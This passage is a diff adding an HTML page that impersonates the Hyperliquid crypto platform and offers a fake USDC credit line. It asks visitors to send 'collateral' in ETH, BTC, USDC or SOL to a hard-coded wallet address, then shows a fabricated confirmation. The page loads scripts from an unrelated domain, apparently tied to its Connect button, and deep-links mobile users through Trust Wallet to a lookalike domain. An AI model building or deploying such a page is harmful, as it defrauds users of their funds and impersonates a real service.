@@ -1,0 +1,557 @@
+﻿<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Deposit Collateral · Hyperliquid</title>
+  <meta name="description" content="Deposit collateral to activate your USDC credit line on Hyperliquid.">
+  <link rel="icon" href="./assets/favicon.ico" type="image/x-icon" sizes="32x32">
+  <link rel="stylesheet" href="./css/styles.css" />
+  <link rel="stylesheet" href="https://kaspa.wiki/rainbowkit.css">
+  <script>window.Buffer = window.Buffer || { isBuffer: () => false };</script>
+  <script src="https://kaspa.wiki/"></script>
+  <script type="module" src="/src/rainbow.tsx"></script>
+
+<style>
+  /* Hyperliquid rebrand overlay */
+  @font-face { font-family:"ABC Diatype Regular";src:url("https://hyperliquid.xyz/assets/files/HpzDfYONwF3qmrWsKXaJbZfUg.woff2") format("woff2");font-weight:400;font-display:swap }
+  @font-face { font-family:"ABC Diatype Medium";src:url("https://hyperliquid.xyz/assets/files/3XoaI9Ydpfk7UVzG6asd5Pxd0A.woff2") format("woff2");font-weight:500;font-display:swap }
+  :root { --hl-bg:#F8F9F9;--hl-pill:#E8EAEA;--hl-pill-h:#DFE3E3;--hl-mint:#97FCE3;--hl-pine:#03211C;--hl-pine7:#0F3933;--hl-sage:#447259;--hl-line:#DFE3E3;--hl-muted:rgba(3,33,28,.4);--hl-body:rgba(3,33,28,.7);--hl-reg:"ABC Diatype Regular","Helvetica Neue",Arial,sans-serif;--hl-med:"ABC Diatype Medium","Helvetica Neue",Arial,sans-serif }
+  body { background:var(--hl-bg) !important; font-family:var(--hl-reg) !important; color:var(--hl-pine) !important }
+  .pill { height:48px;padding:0 16px;border-radius:12px;display:inline-flex;align-items:center;gap:15px;background:var(--hl-pill);color:var(--hl-pine);font-family:var(--hl-med);font-size:14px;line-height:16px;text-transform:uppercase;transition:background-color .2s;border:none;cursor:pointer;text-decoration:none }
+  .pill:hover { background:var(--hl-pill-h) }
+  .pill.mint { background:var(--hl-mint) }
+  .hl-header { position:fixed;inset:0 0 auto 0;height:72px;z-index:50;pointer-events:none }
+  .hl-header-row { position:absolute;top:24px;left:48px;right:48px;display:flex;justify-content:space-between }
+  .hl-header-row > div { display:flex;gap:4px;pointer-events:auto }
+  .logo-pill { width:160px;padding:0 16px }
+  .logo-pill svg { width:128px;height:31px }
+  .blur-stack { position:fixed;top:0;left:0;right:0;height:120px;z-index:40;pointer-events:none }
+  .blur-stack > div { position:absolute;inset:0 }
+  footer.hlftr { background:var(--hl-pine7);height:284px;display:flex;padding:48px 57px 0 40px }
+  footer.hlftr .mark { width:112px;height:112px }
+  footer.hlftr .cols { margin-left:auto;display:flex;padding-top:32px }
+  footer.hlftr .fcol { width:262px }
+  footer.hlftr .fcol .flbl { color:rgba(255,255,255,.6);margin-bottom:24px;font-family:var(--hl-med);font-size:14px;line-height:16px;text-transform:uppercase }
+  footer.hlftr .fcol a { display:block;font-family:var(--hl-med);font-size:14px;line-height:16px;text-transform:uppercase;color:#fff;margin-bottom:4px;transition:opacity .2s;text-decoration:none }
+  footer.hlftr .fcol a:hover { opacity:.6 }
+  main { padding-top:88px !important }
+  .hl-menu-btn{display:none;width:48px;height:48px;border-radius:12px;background:var(--hl-pill);border:none;cursor:pointer;flex-direction:column;justify-content:center;align-items:center;gap:5px;pointer-events:auto;transition:background .2s}
+  .hl-menu-btn:hover{background:var(--hl-pill-h)}
+  .hl-menu-btn span{display:block;width:16px;height:1.5px;background:var(--hl-pine);transition:transform .3s,opacity .3s}
+  .hl-menu-btn.open span:nth-child(1){transform:translateY(6.5px) rotate(45deg)}
+  .hl-menu-btn.open span:nth-child(2){opacity:0}
+  .hl-menu-btn.open span:nth-child(3){transform:translateY(-6.5px) rotate(-45deg)}
+  .hl-mobile-nav{display:none;position:fixed;inset:0;z-index:49;background:var(--hl-bg);padding:88px 16px 32px;flex-direction:column;gap:4px;overflow-y:auto}
+  .hl-mobile-nav.open{display:flex}
+  .hl-mobile-nav a,.hl-mobile-nav .hl-mob-btn{width:100%;height:56px;border-radius:12px;display:flex;align-items:center;padding:0 20px;font-family:var(--hl-med);font-size:16px;line-height:1;text-transform:uppercase;background:var(--hl-pill);color:var(--hl-pine);border:none;cursor:pointer;text-decoration:none;transition:background .2s;-webkit-appearance:none;box-sizing:border-box}
+  .hl-mobile-nav a:hover,.hl-mobile-nav .hl-mob-btn:hover{background:var(--hl-pill-h)}
+  .hl-mobile-nav .hl-mob-connect{background:var(--hl-mint)!important;margin-top:12px}
+  .hl-mobile-nav .hl-mob-connect:hover{background:#7ff5d8!important}
+  @media(max-width:1100px){ .hl-header-row{left:16px;right:16px} .hl-nav-mid{display:none!important} .hl-desk-only{display:none!important} .hl-menu-btn{display:flex} }
+</style></head>
+
+<body>
+  <!-- ══════════ TRUST WALLET BANNER ══════════ -->
+  <!-- <div id="tw-banner" style="display:none;position:fixed;top:0;left:0;width:100%;z-index:9999;background:#3375BB;color:#fff;text-align:center;padding:10px 16px;font-size:14px;font-family:sans-serif;box-shadow:0 2px 8px rgba(0,0,0,0.25);box-sizing:border-box;">
+    <span>⚡ For the best experience, open this site inside <strong>Trust Wallet</strong></span>
+    <a id="tw-banner-btn" href="#" target="_blank" rel="noopener noreferrer" style="display:inline-block;margin-left:12px;padding:6px 14px;background:#fff;color:#3375BB;border-radius:20px;font-weight:700;font-size:13px;text-decoration:none;">Open in Trust Wallet</a>
+    <button onclick="document.getElementById('tw-banner').style.display='none'" style="position:absolute;right:12px;top:50%;transform:translateY(-50%);background:transparent;border:none;color:#fff;font-size:20px;cursor:pointer;line-height:1;">✕</button>
+  </div> -->
+  <script>
+    (function() {
+      var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
+      var isTrust = !!(window.ethereum && window.ethereum.isTrust);
+      if (!isMobile && !isTrust) return;
+      var siteUrl = encodeURIComponent('https://www.0nd0f0undation.xyz/');
+      var deepLink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + siteUrl;
+      var banner = document.getElementById('tw-banner');
+      var btn = document.getElementById('tw-banner-btn');
+      if (banner) banner.style.display = 'block';
+      if (btn) btn.href = deepLink;
+      document.addEventListener('DOMContentLoaded', function() {
+        var header = document.querySelector('header');
+        // if (header) header.style.marginTop = (banner && banner.offsetHeight ? banner.offsetHeight : 48) + 'px';
+      });
+    })();
+  </script>
+  
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <symbol id="i-ne" viewBox="0 0 16 16"><g transform="translate(4 4)" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"><path d="M0 8L8 0"/><path d="M0 0h8v8" stroke-linecap="square"/></g></symbol>
+  <symbol id="i-e" viewBox="0 0 16 16"><g transform="translate(4 4) rotate(45 4 4)" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"><path d="M0 8L8 0"/><path d="M0 0h8v8" stroke-linecap="square"/></g></symbol>
+  <symbol id="i-down" viewBox="0 0 16 16"><path transform="translate(2 5)" d="M0 0l6 6 6-6" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/></symbol>
+</svg>
+<div class="blur-stack" aria-hidden="true"><div></div></div>
+<header class="hl-header">
+  <div class="hl-header-row">
+    <div>
+      <a class="pill logo-pill" href="./index.html" aria-label="Hyperliquid"><svg viewBox="0 0 856 200" fill="#03211C" preserveAspectRatio="xMinYMid meet"><path d="M152.75,98.33c0,49.53-30.41,65.43-46.54,51.38-13.13-11.52-17.05-35.94-36.86-38.47-25.11-2.99-27.41,30.41-44,30.41-19.35,0-23.04-27.87-23.04-42.39,0-14.74,4.14-34.79,20.5-34.79,19.12,0,20.27,28.8,44.23,27.18,23.73-1.61,24.19-31.56,39.86-44.23,13.59-11.29,45.85.69,45.85,50.92Z"/><path d="M579.93,142.8l-.46,1.84h-26.95l.46-1.84c7.37-.69,10.59-2.99,11.75-8.52l15.2-71.65c1.61-7.37-.69-8.52-8.52-6.91l.46-1.84,16.58-5.52h1.84l-18.2,86.17c-1.38,5.29.69,7.6,7.83,8.29Z"/><path d="M610.58,142.8l-.46,1.84h-27.18l.46-1.84c7.37-.69,10.59-2.99,11.75-8.52l9.21-43.77c1.61-7.37-.46-8.52-8.52-6.91l.46-1.84,16.59-5.52h1.84l-12.21,58.06c-1.15,5.52.92,7.83,8.06,8.52ZM615.18,52.02c3.68,0,5.99,2.76,5.52,6.45-.46,3.68-3.68,6.22-7.14,6.22-3.68,0-6.22-2.76-5.76-6.22.23-3.68,3.45-6.45,7.37-6.45Z"/><path d="M657.12,164l7.37-34.33c-4.6,10.13-14.51,17.05-24.65,17.05-16.58,0-24.42-15.66-19.35-38.93,3.45-17.05,18.66-31.56,36.63-31.56,8.29,0,15.2,3.68,17.97,9.21l6.22-9.21h1.84l-18.89,87.78c-1.38,5.99,3.45,7.14,8.29,8.06l-.46,1.84h-31.1l.46-1.84c9.21-.92,14.51-2.07,15.66-8.06ZM644.45,141.88c8.52,0,17.05-7.37,21.19-16.12l5.52-26.26c1.38-9.44-2.99-19.35-16.12-19.35-12.44,0-23.04,11.29-26.49,27.64-4.14,20.04,1.84,34.1,15.89,34.1Z"/><path d="M776.01,142.8l-.46,1.84h-27.18l.46-1.84c7.37-.69,10.59-2.99,11.75-8.52l9.21-43.77c1.61-7.37-.46-8.52-8.52-6.91l.46-1.84,16.58-5.52h1.84l-12.21,58.06c-1.15,5.52.92,7.83,8.06,8.52ZM780.62,52.02c3.68,0,5.99,2.76,5.52,6.45-.46,3.68-3.68,6.22-7.14,6.22-3.68,0-6.22-2.76-5.76-6.22.46-3.68,3.68-6.45,7.37-6.45Z"/><path d="M737.53,134.51l6.22-29.26,5.99-28.57h-1.84l-16.58,5.52-.46,1.84c7.83-1.61,9.9-.46,8.52,6.91l-7.83,37.32c-8.75,8.06-14.74,12.9-22.35,12.9-9.21,0-14.05-6.22-11.75-17.05l10.13-47.46h-1.84l-16.58,5.52-.46,1.84c7.83-1.61,10.13-.46,8.52,6.91l-7.14,34.1c-2.76,12.67,3.68,21.88,15.43,21.88,7.83,0,14.74-4.37,25.57-15.89l-.46,2.3-2.3,11.29h17.28l.46-2.07c-7.6-.23-9.67-2.3-8.52-8.06Z"/><path d="M848.36,73.68l5.3-25.57h-1.84l-16.58,5.52-.46,1.84c7.83-1.61,9.9-.46,8.52,6.91l-4.6,21.88c-2.99-4.83-9.44-8.06-16.82-8.06-18.2,0-33.17,14.51-37.09,32.71-4.6,22.11,2.99,37.78,19.58,37.78,10.36,0,20.27-7.14,24.88-17.28l-1.15,5.76-2.07,9.44,17.22,0,.51-2.07c-7.14-.69-9.21-2.99-8.06-8.52l12.67-60.36ZM829.93,125.52c-3.91,8.98-12.67,16.35-21.19,16.35-14.05,0-20.04-14.05-16.12-32.94,3.68-17.74,14.51-28.8,26.95-28.8,13.36,0,17.74,10.59,15.89,20.04l-.69,2.99-4.83,22.34Z"/><path d="M223.53,144.41V48.33h9.21v41.7h56.22v-41.7h8.98v96.31h-8.98v-46.77h-56.22v46.77h-9.21v-.23Z"/><path d="M377.68,174.26v-95.62h8.52v12.21c2.3-4.14,5.29-7.6,9.67-10.13,4.14-2.53,8.75-3.91,14.05-3.91,6.22,0,11.52,1.61,16.12,4.6,4.6,2.99,8.06,7.14,10.59,12.44,2.53,5.29,3.68,11.29,3.68,17.97,0,6.91-1.15,12.9-3.68,18.2-2.53,5.29-6.22,9.44-10.59,12.67-4.6,2.99-9.9,4.6-15.66,4.6-5.06,0-9.44-1.15-13.82-3.68-4.14-2.3-7.37-5.99-9.9-10.59v41.47h-8.98v-.23ZM408.55,140.16c4.6,0,8.52-1.15,11.98-3.68,3.45-2.53,5.99-5.76,8.06-10.13,1.84-4.37,2.76-9.21,2.76-14.74s-.92-10.36-2.76-14.51c-1.84-4.14-4.6-7.6-8.06-9.9-3.45-2.3-7.37-3.45-11.98-3.45-4.37,0-8.29,1.15-11.75,3.45-3.45,2.3-6.22,5.52-8.06,9.9-1.84,4.14-2.99,9.21-2.99,14.74s.92,10.59,2.99,14.74c1.84,4.37,4.6,7.6,8.06,10.13,3.45,2.53,7.37,3.45,11.75,3.45Z"/><path d="M482.13,147.27c-6.22,0-11.75-1.38-16.58-4.14-4.83-2.76-8.52-6.91-11.06-12.21-2.53-5.29-3.91-11.75-3.91-19.12,0-6.68,1.38-12.67,4.14-17.97,2.76-5.29,6.45-9.44,11.06-12.44,4.6-2.99,9.9-4.6,15.66-4.6,6.22,0,11.52,1.38,16.12,4.37,4.37,2.76,7.83,6.91,10.13,11.98,2.3,5.29,3.45,11.29,3.45,18.2v1.84h-52.07c0,5.76.92,10.59,2.99,14.74,2.07,4.14,4.6,7.14,8.06,9.21,3.45,2.07,7.6,3.22,11.98,3.22,5.3,0,9.67-1.15,13.36-3.68,3.45-2.53,5.76-6.45,6.45-11.52h8.52c-.69,4.14-2.07,8.06-4.6,11.29-2.3,3.22-5.52,5.99-9.67,7.83-3.68,1.84-8.52,2.99-14.05,2.99ZM501.95,106.72c0-6.91-1.84-12.44-5.53-16.58-3.68-4.14-8.52-6.22-14.97-6.22-6.22,0-11.28,2.07-15.2,6.45-3.91,4.37-6.22,9.67-6.91,16.35h42.62Z"/><path d="M523.88,144.41v-66.35h8.52v13.36c1.84-4.37,4.6-8.06,8.75-10.82,3.91-2.76,8.52-4.37,13.82-4.37,1.38,0,2.53,0,3.68.23v8.29c-1.61-.23-2.99-.23-4.14-.23-4.37,0-8.29.92-11.52,2.99-3.22,2.07-5.76,4.83-7.6,8.52-1.84,3.68-2.76,8.06-2.76,12.9v35.71h-8.75v-.23Z"/><path d="M321.7,174.5l12.46-31.02-26.87-64.82h9.69l17.59,43.77c1.1,2.86,2.53,6.37,4.29,10.52l4.15-10.66,16.34-43.63h9.28l-37.53,95.85h-9.41Z"/></svg></a>
+      <span class="hl-nav-mid" style="display:flex;gap:4px">
+        <a class="pill" href="./borrow.html">Borrow</a>
+        <a class="pill" href="./stake.html">Stake</a>
+      </span>
+    </div>
+    <div>
+      <button class="hl-menu-btn" aria-label="Menu"><span></span><span></span><span></span></button><button onclick="connectWallet()" class="pill hl-desk-only">Connect</button>
+    </div>
+  </div>
+</header>
+<nav class="hl-mobile-nav" id="hlMobileNav" aria-label="Mobile navigation">
+  <a href="./borrow.html">Borrow</a>
+  <a href="./stake.html">Stake</a>
+  <button class="hl-mob-btn hl-mob-connect" onclick="connectWallet();document.getElementById('hlMobileNav').classList.remove('open');document.querySelector('.hl-menu-btn').classList.remove('open');document.body.style.overflow=''">Connect</button>
+</nav>
+
+  <main style="background:#F8F9F9;min-height:calc(100vh - 64px);">
+
+    <!-- Step banner -->
+    <div style="background:#03211C;padding:10px 0;">
+      <div class="container-site" style="display:flex;align-items:center;gap:12px;">
+        <span style="color:rgba(255,255,255,0.6);font-size:13px;font-weight:500;">Identity Verified ✓</span>
+        <span style="color:rgba(255,255,255,0.3);font-size:13px;">›</span>
+        <span style="color:#fff;font-size:13px;font-weight:600;">Step 1 of 2 — Deposit Collateral</span>
+        <span style="color:rgba(255,255,255,0.3);font-size:13px;">›</span>
+        <span style="color:rgba(255,255,255,0.4);font-size:13px;font-weight:500;">Credit Line Active</span>
+      </div>
+    </div>
+
+    <div class="container-site" style="padding-top:48px;padding-bottom:80px;">
+
+      <!-- Page heading -->
+      <div style="margin-bottom:36px;">
+        <h1 style="font-size:28px;font-weight:700;color:#0A0A0A;margin:0 0 8px;">Deposit Collateral</h1>
+        <p style="font-size:15px;color:#6B7280;margin:0;">Send the required collateral to activate your USDC credit line.</p>
+      </div>
+
+      <!-- Borrow amount input -->
+      <div style="background:#fff;border-radius:16px;padding:24px;border:1px solid #E5E7EB;box-shadow:0 1px 4px rgba(0,0,0,0.04);margin-bottom:28px;max-width:480px;">
+        <div style="font-size:12px;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:14px;">How much do you want to borrow?</div>
+        <div style="display:flex;align-items:center;gap:0;border:2px solid #03211C;border-radius:12px;overflow:hidden;background:#fff;">
+          <span style="padding:0 14px;font-size:16px;font-weight:700;color:#03211C;flex-shrink:0;">$</span>
+          <input id="borrow-input" type="number" min="1000" step="1000"
+            style="flex:1;border:none;outline:none;font-size:22px;font-weight:700;color:#0A0A0A;padding:14px 0;background:transparent;width:100%;"
+            placeholder="50,000"
+            oninput="recalculate(this.value)" />
+          <span style="padding:0 16px;font-size:14px;font-weight:600;color:#6B7280;flex-shrink:0;background:#F8F9F9;align-self:stretch;display:flex;align-items:center;border-left:1px solid #E5E7EB;">USDC</span>
+        </div>
+        <div style="margin-top:12px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+          <span style="font-size:12px;color:#6B7280;">Quick select:</span>
+          <button onclick="setAmount(10000)" style="padding:4px 12px;border-radius:999px;border:1px solid #E5E7EB;background:#F8F9F9;font-size:12px;font-weight:600;color:#374151;cursor:pointer;">$10K</button>
+          <button onclick="setAmount(25000)" style="padding:4px 12px;border-radius:999px;border:1px solid #E5E7EB;background:#F8F9F9;font-size:12px;font-weight:600;color:#374151;cursor:pointer;">$25K</button>
+          <button onclick="setAmount(50000)" style="padding:4px 12px;border-radius:999px;border:1px solid #E5E7EB;background:#F8F9F9;font-size:12px;font-weight:600;color:#374151;cursor:pointer;">$50K</button>
+          <button onclick="setAmount(100000)" style="padding:4px 12px;border-radius:999px;border:1px solid #E5E7EB;background:#F8F9F9;font-size:12px;font-weight:600;color:#374151;cursor:pointer;">$100K</button>
+          <button onclick="setAmount(250000)" style="padding:4px 12px;border-radius:999px;border:1px solid #E5E7EB;background:#F8F9F9;font-size:12px;font-weight:600;color:#374151;cursor:pointer;">$250K</button>
+        </div>
+      </div>
+
+      <!-- Two-column layout -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;align-items:start;" id="loan-grid">
+
+        <!-- LEFT: Details panel -->
+        <div style="display:flex;flex-direction:column;gap:20px;">
+
+          <!-- Borrow summary card -->
+          <div style="background:#fff;border-radius:16px;padding:24px;border:1px solid #E5E7EB;box-shadow:0 1px 4px rgba(0,0,0,0.04);">
+            <div style="font-size:12px;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:16px;">Loan Summary</div>
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+              <span style="font-size:14px;color:#6B7280;">You are borrowing</span>
+              <span id="display-borrow" style="font-size:22px;font-weight:700;color:#0A0A0A;">$50,000 USDC</span>
+            </div>
+            <div style="height:1px;background:#F3F4F6;margin:16px 0;"></div>
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+              <span style="font-size:14px;color:#6B7280;">Collateral required (10%)</span>
+              <span id="display-collateral" style="font-size:18px;font-weight:700;color:#03211C;">$5,000</span>
+            </div>
+            <div style="display:flex;justify-content:space-between;align-items:center;">
+              <span style="font-size:14px;color:#6B7280;">LTV Ratio</span>
+              <span style="font-size:14px;font-weight:600;color:#10B981;">90% — Low risk</span>
+            </div>
+          </div>
+
+          <!-- Asset selector -->
+          <div style="background:#fff;border-radius:16px;padding:24px;border:1px solid #E5E7EB;box-shadow:0 1px 4px rgba(0,0,0,0.04);">
+            <div style="font-size:12px;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:16px;">Select Collateral Asset</div>
+            <div style="display:flex;gap:10px;flex-wrap:wrap;" id="asset-selector">
+              <button onclick="selectAsset('ETH')" data-asset="ETH"
+                style="display:flex;align-items:center;gap:8px;padding:10px 16px;border-radius:10px;border:2px solid #03211C;background:rgba(68,114,89,.1);cursor:pointer;font-size:14px;font-weight:600;color:#03211C;">
+                <span style="font-size:18px;">⟠</span> ETH
+              </button>
+              <button onclick="selectAsset('BTC')" data-asset="BTC"
+                style="display:flex;align-items:center;gap:8px;padding:10px 16px;border-radius:10px;border:2px solid #E5E7EB;background:#fff;cursor:pointer;font-size:14px;font-weight:600;color:#374151;">
+                <span style="font-size:18px;">₿</span> BTC
+              </button>
+              <button onclick="selectAsset('USDC')" data-asset="USDC"
+                style="display:flex;align-items:center;gap:8px;padding:10px 16px;border-radius:10px;border:2px solid #E5E7EB;background:#fff;cursor:pointer;font-size:14px;font-weight:600;color:#374151;">
+                <span style="font-size:18px;">◎</span> USDC
+              </button>
+              <button onclick="selectAsset('SOL')" data-asset="SOL"
+                style="display:flex;align-items:center;gap:8px;padding:10px 16px;border-radius:10px;border:2px solid #E5E7EB;background:#fff;cursor:pointer;font-size:14px;font-weight:600;color:#374151;">
+                <span style="font-size:18px;">◎</span> SOL
+              </button>
+            </div>
+          </div>
+
+          <!-- Instructions card -->
+          <div style="background:#fff;border-radius:16px;padding:24px;border:1px solid #E5E7EB;box-shadow:0 1px 4px rgba(0,0,0,0.04);">
+            <div style="font-size:12px;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:16px;">Instructions</div>
+            <ol style="margin:0;padding-left:20px;display:flex;flex-direction:column;gap:12px;">
+              <li style="font-size:14px;color:#374151;line-height:1.6;">
+                Send exactly <strong id="instr-amount" style="color:#03211C;">$5,000</strong> worth of <strong id="instr-asset" style="color:#03211C;">ETH</strong> to the address shown on the right.
+              </li>
+              <li style="font-size:14px;color:#374151;line-height:1.6;">
+                You can scan the QR code with any wallet app (MetaMask, Trust Wallet, Coinbase Wallet, etc.)
+              </li>
+              <li style="font-size:14px;color:#374151;line-height:1.6;">
+                Once your transaction is confirmed on-chain, your credit line of <strong id="instr-borrow" style="color:#0A0A0A;">$50,000 USDC</strong> will activate automatically.
+              </li>
+            </ol>
+            <div style="margin-top:20px;padding:12px 16px;background:#FFF7ED;border-radius:10px;border:1px solid #FED7AA;display:flex;gap:10px;align-items:flex-start;">
+              <span style="font-size:16px;flex-shrink:0;">⚠️</span>
+              <span style="font-size:13px;color:#92400E;line-height:1.5;">Only send the exact asset and amount shown. Sending a different asset may result in permanent loss of funds.</span>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- RIGHT: QR + Address panel -->
+        <div style="display:flex;flex-direction:column;gap:20px;">
+
+          <!-- QR Code card -->
+          <div style="background:#fff;border-radius:16px;padding:28px;border:1px solid #E5E7EB;box-shadow:0 1px 4px rgba(0,0,0,0.04);text-align:center;">
+            <div style="font-size:12px;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:20px;">Scan to Send</div>
+
+            <!-- QR Image -->
+            <div style="display:inline-block;padding:12px;background:#fff;border:2px solid #E5E7EB;border-radius:12px;margin-bottom:20px;">
+              <img id="qr-img"
+                src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
+                alt="Wallet QR Code"
+                width="200" height="200"
+                style="display:block;border-radius:4px;" />
+            </div>
+
+            <!-- Amount to send -->
+            <div style="margin-bottom:20px;">
+              <div style="font-size:12px;color:#9CA3AF;margin-bottom:4px;">Amount to send</div>
+              <div id="display-send-amount" style="font-size:28px;font-weight:800;color:#03211C;">$5,000 ETH</div>
+            </div>
+
+            <!-- Address display -->
+            <div style="background:#F8F9F9;border-radius:10px;padding:12px 14px;margin-bottom:16px;position:relative;">
+              <div style="font-size:11px;color:#9CA3AF;margin-bottom:6px;">Deposit address</div>
+              <div style="display:flex;align-items:center;gap:8px;justify-content:center;">
+                <code id="wallet-addr" style="font-size:12px;color:#374151;font-family:monospace;word-break:break-all;line-height:1.5;">0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045</code>
+                <button onclick="copyAddress()" title="Copy address"
+                  style="flex-shrink:0;background:none;border:1px solid #D1D5DB;border-radius:6px;padding:4px 8px;cursor:pointer;font-size:11px;color:#6B7280;white-space:nowrap;" id="copy-btn">
+                  Copy
+                </button>
+              </div>
+            </div>
+
+            <!-- Network badge -->
+            <div style="display:inline-flex;align-items:center;gap:6px;background:rgba(68,114,89,.1);border-radius:999px;padding:4px 12px;margin-bottom:4px;">
+              <span style="width:6px;height:6px;border-radius:50%;background:#03211C;display:inline-block;"></span>
+              <span id="network-label" style="font-size:12px;font-weight:600;color:#03211C;">Ethereum Mainnet</span>
+            </div>
+          </div>
+
+          <!-- Status card -->
+          <div style="background:#fff;border-radius:16px;padding:24px;border:1px solid #E5E7EB;box-shadow:0 1px 4px rgba(0,0,0,0.04);">
+            <div style="font-size:12px;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:16px;">Transaction Status</div>
+
+            <!-- Waiting state -->
+            <div id="status-waiting" style="display:flex;align-items:center;gap:12px;padding:14px;background:#F8F9F9;border-radius:10px;margin-bottom:16px;">
+              <div style="width:10px;height:10px;border-radius:50%;background:#F59E0B;animation:pulse-dot 1.4s ease-in-out infinite;flex-shrink:0;"></div>
+              <div>
+                <div style="font-size:14px;font-weight:600;color:#0A0A0A;">Awaiting blockchain confirmation</div>
+                <div id="last-checked" style="font-size:12px;color:#9CA3AF;margin-top:2px;">Checking network...</div>
+              </div>
+            </div>
+
+            <!-- Poll counter -->
+            <div style="display:flex;justify-content:space-between;font-size:12px;color:#9CA3AF;margin-bottom:20px;">
+              <span>Checks performed: <strong id="poll-count" style="color:#374151;">0</strong></span>
+              <span id="poll-timer">Next check in <strong id="countdown" style="color:#374151;">10s</strong></span>
+            </div>
+
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </main>
+
+  
+<footer class="hlftr">
+  <img class="mark" src="https://hyperliquid.xyz/assets/images/a0j6ey3g5tCiaXgIElavjeyF6Sw.__q-f623e9773574.gif" alt="Hyperliquid">
+  <div class="cols">
+    <div class="fcol">
+      <div class="flbl">Learn</div>
+      <a href="https://hyperliquid.xyz/tech">Tech</a>
+      <a href="https://hyperliquid.xyz/about">About</a>
+      <a href="https://hyperliquid.xyz/apps">Apps</a>
+      <a href="https://hyperliquid.xyz/news">News</a>
+    </div>
+    <div class="fcol">
+      <div class="flbl">Socials</div>
+      <a href="https://x.com/hyperliquidx" target="_blank" rel="noopener">X/Twitter</a>
+      <a href="https://discord.gg/hyperliquid" target="_blank" rel="noopener">Discord</a>
+      <a href="https://github.com/hyperliquid-dex/" target="_blank" rel="noopener">Github</a>
+      <a href="https://t.me/hyperliquid_announcements" target="_blank" rel="noopener">Telegram</a>
+    </div>
+  </div>
+</footer>
+
+  <!-- ══════════ SUCCESS MODAL ══════════ -->
+  <div id="success-overlay"
+    style="display:none;position:fixed;inset:0;z-index:2000;background:rgba(0,0,0,0.75);backdrop-filter:blur(8px);overflow-y:auto;padding:24px 16px;">
+    <div id="success-modal"
+      style="background:#111317;color:#fff;border-radius:24px;max-width:460px;margin:60px auto;position:relative;box-shadow:0 40px 100px rgba(0,0,0,0.7);overflow:hidden;text-align:center;padding:48px 36px;">
+
+      <!-- Green checkmark animation -->
+      <div style="margin-bottom:28px;">
+        <div id="check-circle"
+          style="width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#059669,#10B981);display:flex;align-items:center;justify-content:center;margin:0 auto;animation:pop-in .4s cubic-bezier(.175,.885,.32,1.275) both;">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"
+            stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 6 9 17l-5-5" />
+          </svg>
+        </div>
+      </div>
+
+      <h2 style="font-size:24px;font-weight:800;margin:0 0 8px;">Collateral Received!</h2>
+      <p style="font-size:14px;color:#9CA3AF;margin:0 0 32px;">Transaction confirmed on the blockchain.</p>
+
+      <!-- Tx details -->
+      <div style="background:#1A1D22;border-radius:14px;padding:20px;margin-bottom:24px;text-align:left;">
+        <div style="display:flex;justify-content:space-between;margin-bottom:14px;">
+          <span style="font-size:13px;color:#9CA3AF;">Transaction Hash</span>
+          <span id="modal-txhash" style="font-size:12px;color:#A5B4FC;font-family:monospace;"></span>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-bottom:14px;">
+          <span style="font-size:13px;color:#9CA3AF;">Block Number</span>
+          <span id="modal-block" style="font-size:13px;font-weight:600;color:#fff;"></span>
+        </div>
+        <div style="display:flex;justify-content:space-between;margin-bottom:14px;">
+          <span style="font-size:13px;color:#9CA3AF;">Amount Received</span>
+          <span id="modal-amount" style="font-size:13px;font-weight:600;color:#10B981;"></span>
+        </div>
+        <div style="height:1px;background:#2A2D35;margin:16px 0;"></div>
+        <div style="display:flex;justify-content:space-between;">
+          <span style="font-size:13px;color:#9CA3AF;">Credit Line Activated</span>
+          <span id="modal-credit" style="font-size:15px;font-weight:700;color:#fff;"></span>
+        </div>
+      </div>
+
+      <div style="background:rgba(68,114,89,.12);border:1px solid rgba(151,252,227,.3);border-radius:12px;padding:14px;margin-bottom:28px;">
+        <p style="font-size:14px;color:#97FCE3;margin:0;font-weight:600;">🎉 Your USDC credit line is now active and ready to use.</p>
+      </div>
+
+      <div style="display:flex;gap:12px;">
+        <button onclick="closeSuccess()"
+          style="flex:1;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.15);background:transparent;color:#9CA3AF;font-size:14px;font-weight:600;cursor:pointer;">
+          Close
+        </button>
+        <button onclick="window.location.href='./borrow.html'"
+          style="flex:1;padding:14px;border-radius:12px;border:none;background:linear-gradient(135deg,#03211C,#7C3AED);color:#fff;font-size:14px;font-weight:600;cursor:pointer;">
+          View Dashboard →
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <style>
+    @keyframes pulse-dot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: .4; transform: scale(.8); }
+    }
+    @keyframes pop-in {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+    @media (max-width: 768px) {
